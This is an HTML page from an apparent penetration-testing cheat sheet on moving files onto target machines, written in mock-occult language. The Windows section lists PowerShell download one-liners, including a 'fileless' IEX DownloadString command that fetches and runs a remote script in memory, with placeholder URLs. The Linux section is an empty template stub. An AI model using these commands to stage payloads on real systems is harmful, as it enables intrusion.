<h1>📁 File Transfers</h1>

<p>In the profane rites of assessment, the movement of relics—scripts, payloads, and binaries—is both necessary and perilous. This chapter reveals methods for casting files across dimensions, utilizing primitive yet persistent protocols shared among ancient systems both Windows and Linux.</p>

<blockquote><em>“No summoning may begin until the runes are in place.”</em></blockquote>

<hr/>

<details>
  <summary><strong>Windows</strong></summary>
  <hr/>

  <details>
    <summary><strong>PowerShell DownloadFile Method</strong></summary>
    <p><strong>Sync</strong></p>
    <pre>
      <code class="language-powershell">
        (New-Object Net.WebClient).DownloadFile('&lt;FILE URL&gt;','&lt;OUTPUT FILE NAME&gt;')
      </code>
    </pre>
    <p><strong>Async</strong></p>
    <pre>
      <code class="language-powershell">
          (New-Object Net.WebClient).DownloadFileAsync('&lt;FILE URL&gt;','&lt;OUTPUT FILE NAME&gt;')
      </code>
    </pre>
  </details>

  <details>
    <summary><strong>PowerShell DownloadString - Fileless Method</strong></summary>
    <p><strong>Base</strong></p>
    <pre>
      <code class="language-powershell">
        IEX (New-Object Net.WebClient).DownloadString('&lt;FILE URL&gt;')
      </code>
    </pre>
    <p><strong>Pipeline input</strong></p>
    <pre>
      <code class="language-powershell">
        (New-Object Net.WebClient).DownloadString('&lt;FILE URL&gt;') | IEX
      </code>
    </pre>
    </details>
  <details>
    <summary><strong>PowerShell Invoke-WebRequest</strong></summary>
    <p><strong>Base</strong></p>
    <pre>
      <code class="language-powershell">
        Invoke-WebRequest &lt;FILE URL&gt; -OutFile &lt;OUTPUT FILE NAME&gt;
      </code>
    </pre>
  </details>

  <hr/>
</details>

<hr/>

<details>
  <summary><strong>Linux</strong></summary>
  <hr/>

  <details>
    <summary><strong>TITLE</strong></summary>
    <p>Contenido del subtema Linux.</p>
  </details>

  <hr/>
</details>
